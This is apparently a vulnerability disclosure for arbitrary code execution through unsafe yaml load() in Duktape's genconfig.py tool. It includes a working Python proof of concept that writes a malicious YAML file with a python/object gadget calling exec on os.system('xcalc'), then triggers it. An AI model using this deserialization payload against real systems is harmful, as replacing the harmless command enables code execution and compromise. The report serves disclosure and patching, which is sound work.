# Description
**Arbitrary Code Excecution** in svaarala/duktape/tools/genconfig.py.
Duktape - embeddable Javascript engine with a focus on portability and compact footprint. Genconfig is a Process Duktape option metadata and produce various useful outputs.
# Technical Description
This package was vulnerable to Arbitrary code execution due to a use of a known vulnerable function **load()** in **yaml**
# Exploit code
**Python File**
```python
import os
from duktape.tools import genconfig
os.system('git clone https://github.com/svaarala/duktape.git')
#os.chdir('duktape/tools/')
exploit = """!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
"""
open('DUK_USE_.yaml','w+').write(exploit)
path = os.getcwd()
genconfig.scan_use_defs(path)
os.system('rm DUK_USE_.yaml')
#os.chdir('../../')
```
# POC
* Run the exploit code 

![](https://cdn.discordapp.com/attachments/749019614352244777/786227210599006208/Screenshot_from_2020-12-09_19-15-39.png)
![](https://cdn.discordapp.com/attachments/749019614352244777/786227191515709480/Screenshot_from_2020-12-09_19-15-50.png)
